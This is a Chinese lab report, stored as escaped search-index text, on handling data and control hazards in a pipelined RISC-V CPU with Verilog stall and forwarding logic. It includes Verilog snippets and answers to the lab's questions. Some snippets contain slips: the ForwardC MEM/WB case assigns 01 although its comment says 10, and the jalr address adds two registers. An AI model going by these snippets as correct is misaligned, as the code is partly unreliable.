\u8f7d\u5165\u7ed9\u51fa\u7684\u521d\u59cb RAM\uff0c\u4eff\u771f\u6ce2\u5f62\u53ca\u5176\u5206\u6790\u5982\u4e0b\uff0c\u53ef\u89c1\u8ba1\u7b97\u7ed3\u679c\u5747\u6b63\u786e\uff0c\u6682\u505c\u4e5f\u7b26\u5408\u9884\u671f \u63a7\u5236\u5192\u9669 \u00b6 \u5206\u652f\u5224\u65ad\u524d\u79fb \u00b6 \u6309\u7167\u4e4b\u524d\u7684\u8bbe\u8ba1\uff0c\u5173\u4e8e\u5206\u652f\u8df3\u8f6c\u8bed\u53e5\u7684 pc_next \u8ba1\u7b97\u662f\u5728 MEM \u6bb5\u5b8c\u6210\u7684\uff08\u5229\u7528\u4ece EX \u6bb5\u4f20\u51fa\u6765\u7684 alu_result\uff09\uff0c\u4f46\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5bf9\u4e8e\u6bcf\u4e00\u6761\u5206\u652f\u8df3\u8f6c\u8bed\u53e5\u540e\u9762\u90fd\u9700\u8981\u7b49\u5f85\u4e09\u4e2a\u5468\u671f\u624d\u80fd\u5f97\u5230\u6b63\u786e pc\u3002\u800c\u5b9e\u9645\u4e0a\u5728 ID \u6bb5\u5c31\u53ef\u4ee5\u6839\u636e\u4ece\u5bc4\u5b58\u5668\u4e2d\u8bfb\u51fa\u6765\u7684\u7ed3\u679c\u5224\u65ad\u662f\u5426\u9700\u8981\u5206\u652f\u3002\u6240\u4ee5\u53ef\u4ee5\u5c06 MEM \u9636\u6bb5\u7684 pc mux \u79fb\u5230 ID \u6bb5\uff0c\u8fd9\u6837\u5c31\u53ea\u9700\u8981\u7b49\u5f85\u4e00\u4e2a\u5468\u671f\u3002 \u8fd9\u6837\u7b49\u5f85\u4e00\u4e2a\u5468\u671f\u548c\u524d\u9762\u7684 stall \u5c31\u5f88\u76f8\u4f3c\u4e86\uff0c\u4f46\u662f\u8fd8\u6709\u4e00\u4e9b\u4e0d\u540c\uff0c\u524d\u9762\u6570\u636e\u5192\u9669\u7684 stall \u662f\u5c06\u5f53\u524d\u6307\u4ee4\u6682\u505c\uff0c\u5373\u53d8\u6210\u4e00\u4e2a bubble \u4f20\u4e0b\u53bb\u800c\u5f53\u524d\u6307\u4ee4\u7b49\u5f85\u3002\u800c\u6b64\u5904\u7684\u5f53\u524d\u6307\u4ee4\u662f branch \u6307\u4ee4\uff0c\u9700\u8981\u7ee7\u7eed\u4f20\u4e0b\u53bb\uff0c\u800c\u5728\u5176\u540e\u63d2\u5165\u4e00\u6761 bubble\uff0c\u6240\u4ee5\u5b9e\u9645\u7684\u64cd\u4f5c\u4e3a\uff1a pc \u53ef\u4ee5\u7ee7\u7eed\u66f4\u65b0\uff08\u4f46\u662f\u5982\u679c\u68c0\u6d4b\u5230\u4e86\u662f\u8df3\u8f6c\u6307\u4ee4\uff0c\u5219\u5728\u9009\u62e9\u5f53\u524d pc_next \u65f6\u4e0d\u4f20\u5165 pc+4 \u800c\u662f pc\uff0c\u5373\u6682\u505c\u4e00\u6761\uff09 IF/ID \u6bb5\u7684 pc \u53ef\u4ee5\u968f\u610f\uff0cinst \u8bbe\u7f6e\u4e3a 32'h00000013\uff0c\u5373 nop\uff08\u76f8\u5f53\u4e8e\u5728\u540e\u9762\u63d2\u5165\u4e86\u4e00\u6761 bubble\uff09 \u5269\u4e0b\u7684\u90e8\u5206\u90fd\u6b63\u5e38\u66f4\u65b0\u6d41\u8f6c \u56e0\u6b64\u9996\u5148\u9700\u8981\u4e3a\u63a7\u5236\u6a21\u5757\u52a0\u4e00\u4e2a jump \u63a7\u5236\u4fe1\u53f7\u5224\u65ad\u662f\u5426\u662f\u5206\u652f\u8df3\u8f6c\u8bed\u53e5\uff1a module Control ( ... output reg jump ); `include \"AluOp.vh\" always @( * ) begin ... jump = 0 ; case ( op_code ) ... 7 'b1100011 : begin // bne beq ... jump = 1 ; end 7 'b1101111 : begin // jal ... jump = 1 ; end 7 'b1100111 : begin // jalr ... jump = 1 ; end ... endcase end endmodule \u7136\u540e\u662f\u65b0\u589e wire jump \u7528\u6765\u4f20\u8f93\uff0c\u4ee5\u53ca\u9488\u5bf9\u4e8e jump \u60c5\u51b5 stall \u7684\u65f6\u5e8f\u66f4\u65b0\uff1a always @( posedge clk or posedge rst ) begin if ( rst ) begin ... end else begin if ( bubble_stop ) begin ... end else if ( jump ) begin pc <= pc_next ; IF_ID_pc <= pc ; IF_ID_inst <= 32'h00000013 ; ID_EX_pc_src <= pc_src ; ID_EX_mem_to_reg <= mem_to_reg ; ID_EX_reg_write <= reg_write ; ID_EX_alu_src <= alu_src ; ID_EX_branch <= branch ; ID_EX_b_type <= b_type ; ID_EX_auipc <= auipc ; ID_EX_alu_op <= alu_op ; ID_EX_mem_write <= mem_write_ ; ID_EX_mem_read <= mem_read ; end else begin ... \u6700\u540e\u662f\u5728 ID \u9636\u6bb5\u7684 pc \u9009\u62e9\u5668\uff1a assign jal_addr = IF_ID_pc + imm ; assign jalr_addr = read_data1 + read_data2 ; MuxPC mux_pc ( . I0 ( jump ? pc : pc + 4 ), . I1 ( jalr_addr ), . I2 ( jal_addr ), . I3 ( jal_addr ), . s ( pc_src ), . branch ( branch ), . b_type ( b_type ), . alu_res ( read_data1 ^ read_data2 ), . o ( pc_next ) ); \u5904\u7406\u63a7\u5236\u5192\u9669\u4e2d\u7684\u6570\u636e\u5192\u9669 \u00b6 \u524d\u9762\u5c06 pc \u9009\u62e9\u5668\u63d0\u524d\u5230 ID \u9636\u6bb5\u5e76 stall \u662f\u4e0d\u591f\u7684\uff0c\u56e0\u4e3a\u4e00\u822c\u5bf9\u4e8e\u5faa\u73af\uff0c\u5728 branch \u8bed\u53e5\u68c0\u67e5\u7684\u524d\u4e00\u6761\u4f1a\u6d89\u53ca\u5230\u5faa\u73af\u53d8\u91cf\u5bc4\u5b58\u5668\u7684\u4fee\u6539\uff0c\u4f8b\u5982\uff1a addi x1 , x1 , -1 bne x1 , x0 , loop \u6b64\u65f6 bne \u9700\u8981\u5728 ID \u9636\u6bb5\u8bfb\u53d6 x1\uff0c\u4f46\u662f\u5728 ID \u9636\u6bb5\u65f6\u4e0a\u4e00\u6761\u6307\u4ee4\u4ecd\u5728 EX \u9636\u6bb5\uff0cx1 \u8fd8\u6ca1\u6709\u66f4\u65b0\u3002\u6240\u4ee5\u9700\u8981 stall \u4e00\u4e2a\u5468\u671f\u7b49\u5f85\u4e0a\u4e00\u6761\u6307\u4ee4 EX \u9636\u6bb5\u7ed3\u675f\uff0c\u7136\u540e\u5c06 ALU \u7ed3\u679c\u901a\u8fc7 forwarding \u4f20\u7ed9 bne \u7684 ID \u9636\u6bb5\u7136\u540e\u8fdb\u884c\u5224\u65ad\u3002\u5373\u4e0b\u56fe\uff1a \u53ef\u4ee5\u770b\u51fa\uff0c\u6b64\u5904\u7684\u6570\u636e\u5192\u9669\u7684 stall \u65b9\u5f0f\u548c\u524d\u9762\u6570\u636e\u5192\u9669\u4e00\u6837\uff0c\u56e0\u6b64\u53ea\u9700\u8981\u5728 StallUnit \u4e2d\u5bf9 bubble_stop \u52a0\u4e00\u4e2a\u6761\u4ef6\u5373\u53ef\uff08\u4e0a\u4e00\u6761\u6307\u4ee4\u6709\u5bc4\u5b58\u5668\u5199\u5165\uff0c\u4e14\u4e0e\u8bfb\u53d6\u7684\u5bc4\u5b58\u5668\u4ea7\u751f\u4e86\u51b2\u7a81\uff09\u3002\u7136\u540e ID \u9636\u6bb5\u7684 forwarding \u9700\u8981\u5355\u72ec\u5199\u4e00\u4e0b\u3002\u5728 branch \u6307\u4ee4\u540e\u9762\u7684 bubble \u5373\u4e3a\u524d\u9762\u5199\u8fc7\u7684 stall\u3002 \u56e0\u6b64\u4ee3\u7801\u4e0a\u7684\u4fee\u6539\uff1a\u5bf9\u4e8e StallUnit \u7684\u4fee\u6539\uff1a module StallUnit ( ... input jump , input ID_EX_reg_write , ... ); assign bubble_stop = (...) || ( jump && ID_EX_reg_write && ID_EX_rd != 0 && ( ID_EX_rd == IF_ID_rs1 || ID_EX_rd == IF_ID_rs2 )); \u5728 ID \u9636\u6bb5\u7684 forwarding\uff1a wire [ 31 : 0 ] reg1 , reg2 ; assign reg1 = ( jump && EX_MEM_reg_write && ( EX_MEM_write_addr != 0 ) && ( EX_MEM_write_addr == IF_ID_inst [ 19 : 15 ])) ? EX_MEM_alu_result : read_data1 ; assign reg2 = ( jump && EX_MEM_reg_write && ( EX_MEM_write_addr != 0 ) && ( EX_MEM_write_addr == IF_ID_inst [ 24 : 20 ])) ? EX_MEM_alu_result : read_data2 ; assign jalr_addr = reg1 + reg2 ; MuxPC mux_pc ( ... . alu_res ( reg1 ^ reg2 ), ... ); \u5176\u5b83\u60c5\u51b5\u5f15\u8d77\u7684\u5192\u9669 \u00b6 \u5728\u524d\u9762\u7b80\u5355\u5904\u7406\u4e86\u6570\u636e\u5192\u9669\u548c\u63a7\u5236\u5192\u9669\u4e4b\u540e\uff0c\u7ed9\u51fa\u7684\u7a0b\u5e8f\u4ecd\u7136\u4e0d\u80fd\u5b8c\u5168\u6b63\u786e\u8fd0\u884c\uff0c\u8fd8\u5b58\u5728\u4e00\u4e9b\u758f\u6f0f\u7684\u6570\u636e\u5192\u9669\uff1a R \u578b\u6307\u4ee4\u540e store \u00b6 \u5982\u679c R \u578b\u6307\u4ee4\u4fee\u6539\u4e86\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u7136\u540e\u901a\u8fc7 store \u5b58\u50a8\u5b83\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5e76\u4e0d\u4f1a store \u6b63\u786e\u7684\u503c\uff0c\u56e0\u4e3a EX \u9636\u6bb5\u7684\u7ed3\u6784\u5982\u4e0b\u56fe\uff08\u9ed1\u3001\u7ea2\u8272\u4e3a\u539f\u6765\u7684\uff09\uff1a \u5176\u4e2d\u5bf9\u4e8e store \u6307\u4ee4\uff0cALU \u548c\u524d\u9762\u4e24\u4e2a mux \u90fd\u4f1a\u7528\u5230\uff08\u7528\u6765\u8ba1\u7b97\u5199\u5165\u5730\u5740\uff09\uff0c\u800c\u5199\u5165\u7684\u503c\u5b9e\u9645\u4e0a\u662f\u76f4\u63a5\u4ece\u5bc4\u5b58\u5668\u8bfb\u53d6\u7684 data2 \u63a5\u5165\u7684\uff08\u5373\u7ea2\u8272\u7ebf\uff09\uff0c\u8fd9\u91cc\u5e76\u6ca1\u6709\u5904\u7406\u6570\u636e\u5192\u9669\u3002\u800c\u4e14\u5199\u5165\u503c\u4e5f\u65e0\u6cd5\u501f\u7528\u524d\u9762\u5199\u8fc7\u7684 forwarding\uff08\u56e0\u4e3a\u6b64\u65f6\u90fd\u5728\u4f7f\u7528\uff09\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u4ece ForwardingUnit \u518d\u5224\u65ad\u3001\u5f15\u51fa\u4e00\u4e2a ForwardC \u4fe1\u53f7\uff0c\u6765\u9009\u62e9\u5199\u5165\u6570\u636e\uff0c\u540c\u7406\uff0c\u53ef\u80fd\u6765\u81ea EX/MEM \u6216 MEM/WB\u3002 \u56e0\u6b64\u4fee\u6539 ForwardingUnit\uff1a module ForwardingUnit ( ... output reg [ 1 : 0 ] ForwardC // 00 \u6765\u81ea data2\u300101 \u6765\u81ea EX/MEM\u300110 \u6765\u81ea MEM/WB ); if ( EX_MEM_reg_write && EX_MEM_rd != 0 && EX_MEM_rd == ID_EX_rs2 ) assign ForwardC = 2 'b01 else if ( MEM_WB_reg_write && MEM_WB_rd != 0 && MEM_WB_rd == ID_EX_rs2 ) assign ForwardC = 2 'b01 else assign ForwardC = 2 'b00 ; \u4ee5\u53ca\u5728 EX \u9636\u6bb5\u589e\u52a0\u4e00\u4e2a\u56db\u8def\u9009\u62e9\u5668\uff08\u6709\u4e00\u8def\u4e0d\u7528\uff09\u6765\u9009\u62e9\u6700\u7ec8\u8981\u8d4b\u503c\u7ed9 EX_MEM_data2 \u7684\u503c\uff08\u5373\u5728 MEM \u9636\u6bb5\u8981\u8fdb\u884c\u5199\u5165\u7684\u503c\uff09\uff1a wire [ 1 : 0 ] forwardC ; wire [ 31 : 0 ] ex_mem_data2 ; Mux4x32 mux_data2 ( . I0 ( ID_EX_data2 ), . I1 ( EX_MEM_alu_result ), . I2 ( write_data ), . I3 ( 32'h00000000 ), . s ( forwardC ), . o ( ex_mem_data2 ) ); \u4ee5\u53ca\u5c06\u65f6\u5e8f\u66f4\u65b0\u91cc\u7684\u66f4\u65b0 EX_MEM_data2 \u4e3a ID_EX_data2 \u6539\u4e3a ex_mem_data2\uff1a ... EX_MEM_data2 <= ex_mem_data2 ; ... lui \u540e R \u578b\u6307\u4ee4 \u00b6 \u524d\u9762\u7684 Forwarding \u4ecd\u7136\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0c\u6bd4\u5982\u5728 lui \u6307\u4ee4\u548c\u5176\u540e\u9762\u7684 R \u578b\u6307\u4ee4\u53d1\u751f\u51b2\u7a81\uff1a lui x1 , 0x0001 add x2 , x1 , x3 \u6b64\u65f6\u7684 add \u8bed\u53e5\u5e76\u4e0d\u4f1a\u6b63\u786e\u5904\u7406\u4e0e\u524d\u9762 lui \u4ea7\u751f\u7684\u6570\u636e\u5192\u9669\uff0c\u56e0\u4e3a add \u8bed\u53e5\u8bfb\u53d6 x1 \u53d1\u751f\u51b2\u7a81\uff0c\u800c\u4e0a\u4e00\u6761\u8bed\u53e5\u6b63\u5728\u4f7f\u7528\uff0c\u6240\u4ee5\u6309\u7167\u524d\u9762\u5199\u7684\u4f1a\u53bb\u8bfb\u53d6 EX_MEM \u5bc4\u5b58\u5668\u4e2d\u7684 alu_result \u4f5c\u4e3a x1 \u7684\u503c\u3002\u4f46\u5b9e\u9645\u4e0a lui \u5199\u56de\u5bc4\u5b58\u5668\u7684\u503c\u5e76\u4e0d\u662f ALU \u7684\u8ba1\u7b97\u7ed3\u679c\uff0c\u800c\u662f lui \u6307\u4ee4\u7684\u7acb\u5373\u6570\uff08\u7531 mem_to_reg \u4fe1\u53f7\u51b3\u5b9a\uff09\u3002 \u53e6\u4e00\u79cd\u60c5\u51b5\u662f jal/jalr \u6307\u4ee4\u8df3\u8f6c\u5230\u7684\u4f4d\u7f6e\u5904\u6709\u4e00\u6761\u6307\u4ee4\u9700\u8981\u8bfb\u53d6\u8fd4\u56de\u5730\u5740\uff08\u4e5f\u5c31\u662f pc+4\uff09\uff0c\u8fd9\u65f6\u5199\u56de\u5bc4\u5b58\u5668\u7684\u4e5f\u4e0d\u662f ALU \u7684\u7ed3\u679c\uff0c\u800c\u662f\u5f53\u524d\u8df3\u8f6c\u6307\u4ee4\u7684 pc+4\u3002\u8fd9\u4e24\u79cd\u60c5\u51b5\u90fd\u53ef\u4ee5\u901a\u8fc7\u5224\u65ad mem_to_reg \u6765\u89e3\u51b3\u3002\u6240\u4ee5\u9700\u8981\u4fee\u6539 ForwardingUnit\uff0c\u5c06 ForwardA\u3001ForwardB \u4fe1\u53f7\u6269\u5c55\u4e00\u4f4d\uff1a module ForwardingUnit ( ... output reg [ 2 : 0 ] ForwardA , // 000 \u6765\u81ea\u5bc4\u5b58\u5668\uff0c001 \u6765\u81ea EX/MEM\uff0c010 \u6765\u81ea MEM/WB\uff0c011 \u6765\u81ea PC // 100 \u6765\u81ea EX/MEM \u7684 PC + 4\uff0c101 \u6765\u81ea MEM/WB \u7684 PC + 4 // 110 \u6765\u81ea EX/MEM \u7684 imm\uff0c111 \u6765\u81ea MEM/WB \u7684 imm output reg [ 2 : 0 ] ForwardB , // ... output reg [ 1 : 0 ] ForwardC ); always @( * ) begin if ( auipc ) begin assign ForwardA = 3 'b011 ; end else begin if ( EX_MEM_reg_write == 1 && EX_MEM_rd != 0 && EX_MEM_rd == ID_EX_rs1 ) begin if ( EX_MEM_mem_to_reg == 2 'b01 ) assign ForwardA = 3 'b110 ; else if ( EX_MEM_mem_to_reg == 2 'b10 ) assign ForwardA = 3 'b100 ; else assign ForwardA = 3 'b001 ; end else if ( MEM_WB_reg_write == 1 && MEM_WB_rd != 0 && MEM_WB_rd == ID_EX_rs1 ) begin if ( MEM_WB_mem_to_reg == 2 'b01 ) assign ForwardA = 3 'b111 ; else if ( MEM_WB_mem_to_reg == 2 'b10 ) assign ForwardA = 3 'b101 ; else assign ForwardA = 3 'b010 ; end else begin assign ForwardA = 3 'b000 ; end end if ( alu_src_b ) begin assign ForwardB = 3 'b011 ; end else begin if ( EX_MEM_reg_write == 1 && EX_MEM_rd != 0 && EX_MEM_rd == ID_EX_rs2 ) begin if ( EX_MEM_mem_to_reg == 2 'b01 ) assign ForwardB = 3 'b110 ; else if ( EX_MEM_mem_to_reg == 2 'b10 ) assign ForwardB = 3 'b100 ; else assign ForwardB = 3 'b001 ; end else if ( MEM_WB_reg_write == 1 && MEM_WB_rd != 0 && MEM_WB_rd == ID_EX_rs2 ) begin if ( MEM_WB_mem_to_reg == 2 'b01 ) assign ForwardB = 3 'b111 ; else if ( MEM_WB_mem_to_reg == 2 'b10 ) assign ForwardB = 3 'b101 ; else assign ForwardB = 3 'b010 ; end else begin assign ForwardB = 3 'b000 ; end end ... // for ForwardC end endmodule \u4ee5\u53ca\u9700\u8981\u4fee\u6539 ALU \u524d\u9009\u62e9\u8f93\u5165\u7684\u4e24\u4e2a\u5bc4\u5b58\u5668\uff0c\u6539\u4e3a\u516b\u8def\u9009\u62e9\u5668\uff1a wire [ 2 : 0 ] forwardA , forwardB ; Mux8x32 mux_alu_a ( . I0 ( ID_EX_data1 ), . I1 ( EX_MEM_alu_result ), . I2 ( write_data ), . I3 ( ID_EX_pc ), . I4 ( EX_MEM_pc + 4 ), . I5 ( MEM_WB_pc + 4 ), . I6 ( EX_MEM_imm ), . I7 ( MEM_WB_imm ), . s ( forwardA ), . o ( alu_data1 ) ); Mux8x32 mux_alu_b ( . I0 ( ID_EX_data2 ), . I1 ( EX_MEM_alu_result ), . I2 ( write_data ), . I3 ( ID_EX_imm ), . I4 ( EX_MEM_pc + 4 ), . I5 ( MEM_WB_pc + 4 ), . I6 ( EX_MEM_imm ), . I7 ( MEM_WB_imm ), . s ( forwardB ), . o ( alu_data2 ) ); \u4eff\u771f\u6d4b\u8bd5\u53ca\u5206\u6790 \u00b6 \u8fd0\u884c\u6240\u7ed9\u7684 lab2.s \u7a0b\u5e8f\uff0c\u8f7d\u5165 lab2-ram.coe \u548c lab2-rom.coe\uff0c\u4ee5 Core_tb.sv \u4e3a\u9876\u5c42\u6a21\u5757\u8fdb\u884c\u4eff\u771f\u3002 \u4eff\u771f\u7ed3\u679c \u00b6 \u4eff\u771f\u6ce2\u5f62\u5982\u4e0b\uff08\u6709\u90e8\u5206\u5faa\u73af\u7701\u7565\u4e86\uff09\uff1a \u6574\u4e2a\u5bc4\u5b58\u5668\u7ec4\u503c\u7684\u53d8\u5316\uff08\u4e0a\u5341\u8fdb\u5236\uff0c\u4e0b\u5341\u516d\u8fdb\u5236\uff09\uff1a \u7ed3\u679c\u5206\u6790 \u00b6 \u6839\u636e\u6c47\u7f16\u4ee3\u7801\u5206\u6790\u6ce2\u5f62\uff1a \u53ef\u4ee5\u770b\u51fa\uff0c\u7ed3\u679c\u5747\u6b63\u786e\uff0c\u4e14\u6309\u7167\u9884\u671f\u8fdb\u884c stall\u3001\u8df3\u8f6c\u3002 \u601d\u8003\u9898 \u00b6 lab 2-1 \u00b6 \u8bf7\u4f60\u5bf9\u6570\u636e\u51b2\u7a81\u60c5\u51b5\u8fdb\u884c\u5206\u6790\u5f52\u7eb3\uff0c\u8bd5\u7740\u5c06\u4ed6\u4eec\u5206\u7c7b\u5217\u51fa\u3002 RISC-V \u6d41\u6c34\u7ebf\u6570\u636e\u51b2\u7a81\u5f52\u7eb3\u540e\u672c\u8d28\u5176\u5b9e\u5c31\u662f\u4e00\u79cd\uff0c\u5373\u5728\u5c1a\u672a\u5199\u5165\u5bc4\u5b58\u5668\u65f6\u8bfb\u53d6\u5176\u503c\uff08RAW\uff09\uff0c\u5176\u5305\u542b\u5f88\u591a\u79cd\u7ec6\u5206\u7684\u60c5\u51b5\uff1a - use-use \u51b2\u7a81 - load-use \u51b2\u7a81 - use-store \u51b2\u7a81 \u5982\u679c EX, MEM, WB \u6bb5\u4e2d\u4e0d\u6b62\u4e00\u4e2a\u6bb5\u7684\u5199\u5bc4\u5b58\u5668\u4e0e ID \u6bb5\u7684\u8bfb\u5bc4\u5b58\u5668\u53d1\u751f\u4e86\u51b2\u7a81\uff0c\u8be5\u5982\u4f55\u5904\u7406\uff1f \u4e0d\u6b62\u4e00\u4e2a\u6bb5\u4e0e ID \u7684\u8bfb\u5bc4\u5b58\u5668\u53d1\u751f\u4e86\u51b2\u7a81\uff0c\u5e94\u8be5\u5148\u8003\u8651\u6700\u8fd1\u7684\u4e00\u4e2a\u5199\u5bc4\u5b58\u5668\uff08\u5148 EX \u7136\u540e MEM \u6700\u540e WB\uff09\uff0c\u5c06\u5176\u503c\u524d\u9012\u5230 ID \u6bb5\u4f5c\u4e3a\u5f53\u524d\u8bfb\u5bc4\u5b58\u5668\u7684\u5b9e\u9645\u503c\u3002 lab 2-2 \u00b6 \u5728\u5f15\u5165 Forwarding \u673a\u5236\u540e\uff0c\u662f\u5426\u610f\u5473\u7740 stall \u673a\u5236\u5c31\u4e0d\u518d\u9700\u8981\u4e86\uff1f\u4e3a\u4ec0\u4e48\uff1f \u4e0d\u662f\uff0c\u56e0\u4e3a Forwarding \u673a\u5236\u53ea\u80fd\u89e3\u51b3\u90e8\u5206\u6570\u636e\u51b2\u7a81\uff0c\u4f8b\u5982 load-use \u51b2\u7a81\u5c31\u65e0\u6cd5\u901a\u8fc7 Forwarding \u5b8c\u5168\u89e3\u51b3\uff0c\u9700\u8981\u5148 stall \u4e00\u4e2a\u5468\u671f\u540e\u518d\u4f7f\u7528 Forwarding\u3002\u5176\u6b21\uff0c\u63a7\u5236\u51b2\u7a81\u4e5f\u9700\u8981\u901a\u8fc7 stall \u624d\u80fd\u89e3\u51b3\u3002 \u4f60\u8ba4\u4e3a Forwarding \u673a\u5236\u5728\u5b9e\u9645\u7684\u7535\u8def\u8bbe\u8ba1\u4e2d\u662f\u5426\u5b58\u5728\u4e00\u5b9a\u7684\u5f0a\u7aef\uff1f\u5982\u679c\u5b58\u5728\uff0c\u8bf7\u7ed9\u51fa\u4f60\u7684\u7406\u7531\u3002 Forwarding \u673a\u5236\u9700\u8981\u5728 ID \u6bb5\u4e2d\u589e\u52a0\u4e00\u4e9b\u9009\u62e9\u5668\uff0c\u589e\u52a0\u4e86\u7535\u8def\u7684\u590d\u6742\u5ea6\uff0c\u540c\u65f6\u4e5f\u589e\u52a0\u4e86\u7535\u8def\u7684\u5ef6\u8fdf\uff0c\u5b58\u5728\u4e00\u4e9b\u5f0a\u7aef\u3002\u4e0d\u8fc7 Forwarding \u673a\u5236\u53ef\u4ee5\u89e3\u51b3\u90e8\u5206\u6570\u636e\u51b2\u7a81\uff0c\u53ef\u4ee5\u51cf\u5c11 stall \u7684\u6b21\u6570\uff0c\u4ece\u800c\u63d0\u9ad8\u7535\u8def\u7684\u6548\u7387\u3002\u603b\u4e4b Forwarding \u673a\u5236\u786e\u5b9e\u6709\u5f0a\u7aef\uff0c\u4f46\u7efc\u5408\u6765\u770b\u4e0d\u4e00\u5b9a\u6709\u6ca1\u6709\u5f0a\u7aef\u3002","title":"\u7cfb\u7edf II lab2"},{"location":"cs/system/cs2/lab2/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab2 \u5b9e\u9a8c\u62a5\u544a\uff082022.10.08 ~ 2022.10.27\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad","title":"\u6d41\u6c34\u7ebf\u5192\u9669\u5904\u7406"},{"location":"cs/system/cs2/lab2/#_2","text":"lab 2-1\uff1a\u6682\u505c\u4e0e\u5192\u9669 \u5728 lab 1 \u7684\u57fa\u7840\u4e0a\u52a0\u5165 stall \u673a\u5236\u5904\u7406\u6570\u636e\u5192\u9669\u548c\u63a7\u5236\u5192\u9669 \u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u68c0\u9a8c CPU \u57fa\u672c\u529f\u80fd \u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5\uff0c\u68c0\u9a8c CPU \u8bbe\u8ba1\u89c4\u8303 \u601d\u8003\u9898 \u8bf7\u4f60\u5bf9\u6570\u636e\u51b2\u7a81\u60c5\u51b5\u8fdb\u884c\u5206\u6790\u5f52\u7eb3\uff0c\u8bd5\u7740\u5c06\u4ed6\u4eec\u5206\u7c7b\u5217\u51fa\u3002 \u5982\u679c EX, MEM, WB \u6bb5\u4e2d\u4e0d\u6b62\u4e00\u4e2a\u6bb5\u7684\u5199\u5bc4\u5b58\u5668\u4e0e ID \u6bb5\u7684\u8bfb\u5bc4\u5b58\u5668\u53d1\u751f\u4e86\u51b2\u7a81\uff0c\u8be5\u5982\u4f55\u5904\u7406\uff1f lab 2-2\uff1a\u65c1\u8def\u4f18\u5316 Forwarding \u5728 lab 2-1 \u57fa\u7840\u4e0a\u5b9e\u73b0 Forwarding \u673a\u5236 \u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\u548c\u4e0a\u677f\u6d4b\u8bd5 \u601d\u8003\u9898 \u5728\u5f15\u5165 Forwarding \u673a\u5236\u540e\uff0c\u662f\u5426\u610f\u5473\u7740 stall \u673a\u5236\u5c31\u4e0d\u518d\u9700\u8981\u4e86\uff1f\u4e3a\u4ec0\u4e48\uff1f \u4f60\u8ba4\u4e3a Forwarding \u673a\u5236\u5728\u5b9e\u9645\u7684\u7535\u8def\u8bbe\u8ba1\u4e2d\u662f\u5426\u5b58\u5728\u4e00\u5b9a\u7684\u5f0a\u7aef\uff1f\u5982\u679c\u5b58\u5728\uff0c\u8bf7\u7ed9\u51fa\u4f60\u7684\u7406\u7531\u3002 \u672c\u62a5\u544a\u6ca1\u6709\u6309\u7167\u4e24\u4e2a lab \u7684\u987a\u5e8f\u8fdb\u884c\uff0c\u800c\u662f\u4ee5\u5177\u4f53\u8fdb\u884c\u4fee\u6539\u7684\u987a\u5e8f\u8fdb\u884c\u7684\uff08\u5148\u5904\u7406\u6570\u636e\u5192\u9669\uff0c\u7136\u540e\u5904\u7406\u63a7\u5236\u5192\u9669\uff0c\u6700\u540e\u5904\u7406\u5728\u5b9e\u9645\u8fd0\u884c\u65f6\u9047\u5230\u7684\u5176\u5b83\u5192\u9669\u95ee\u9898\uff09\u3002","title":"\u5b9e\u9a8c\u5185\u5bb9"},{"location":"cs/system/cs2/lab2/#forwarding","text":"\u548c\u4e0a\u8bfe/\u4e66\u4e0a\u8bb2\u7684\u4e00\u6837\uff0c\u901a\u8fc7\u4e00\u4e2a ForwardingUnit \u6765\u8ba1\u7b97\u662f\u5426\u9700\u8981\u524d\u9012\uff0c\u7136\u540e\u901a\u8fc7\u591a\u8def\u9009\u62e9\u5668\u9009\u62e9\u51fa\u4f20\u5165 ALU \u7684\u7ed3\u679c\u3002 \u5728\u6b64\u57fa\u7840\u4e0a\u9700\u8981\u4e00\u4e9b\u6539\u8fdb\u7684\u662f\uff0c\u5728\u6211\u7684 CPU \u4e2d\uff0cALU \u7684\u4e24\u4e2a\u8f93\u5165\u90fd\u5df2\u7ecf\u9700\u8981\u5148\u9009\u62e9\uff08\u4e00\u4e2a\u901a\u8fc7 auipc \u9009\u62e9 PC \u8fd8\u662f\u5bc4\u5b58\u5668\u503c\uff0c\u4e00\u4e2a\u901a\u8fc7 alu_src \u9009\u62e9\u5bc4\u5b58\u5668\u503c\u8fd8\u662f\u7acb\u5373\u6570\uff09\uff0c\u6240\u4ee5 ForwardingUnit \u8fd8\u9700\u8981\u63a5\u6536 auipc\u3001alu_src \u4e24\u4e2a\u4fe1\u53f7\uff0c\u5982\u679c auipc \u4e3a 1 \u5219\u8be5\u4fa7\u4e0d\u4f1a\u4f7f\u7528\u5bc4\u5b58\u5668\u503c\uff0c\u4e5f\u5c31\u4e0d\u6d89\u53ca\u5230\u6570\u636e\u5192\u9669\uff0calu_src \u4e5f\u540c\u7406\u3002\u8fd9\u6837\u8f93\u51fa\u7684\u503c\u6709\u56db\u79cd\u60c5\u51b5\uff0c\u5177\u4f53\u89c1\u4e0b\u9762\u4ee3\u7801\u6ce8\u91ca\uff1a module ForwardingUnit ( input [ 4 : 0 ] EX_MEM_rd , input [ 4 : 0 ] MEM_WB_rd , input [ 4 : 0 ] ID_EX_rs1 , input [ 4 : 0 ] ID_EX_rs2 , input EX_MEM_reg_write , input MEM_WB_reg_write , input auipc , input alu_src_b , output reg [ 1 : 0 ] ForwardA , // 00 \u6765\u81ea\u5bc4\u5b58\u5668\uff0c01 \u6765\u81ea EX/MEM\uff0c10 \u6765\u81ea MEM/WB\uff0c11 \u6765\u81ea PC output reg [ 1 : 0 ] ForwardB // 00 \u6765\u81ea\u5bc4\u5b58\u5668\uff0c01 \u6765\u81ea EX/MEM\uff0c10 \u6765\u81ea MEM/WB\uff0c11 \u6765\u81ea imm ); always @( * ) begin if ( auipc ) assign ForwardA = 2 'b11 ; else begin if ( EX_MEM_reg_write == 1 && EX_MEM_rd != 0 && EX_MEM_rd == ID_EX_rs1 ) assign ForwardA = 2 'b01 ; else if ( MEM_WB_reg_write == 1 && MEM_WB_rd != 0 && MEM_WB_rd == ID_EX_rs1 ) assign ForwardA = 2 'b10 ; else assign ForwardA = 2 'b00 ; end if ( alu_src_b ) assign ForwardB = 2 'b11 ; else begin if ( EX_MEM_reg_write == 1 && 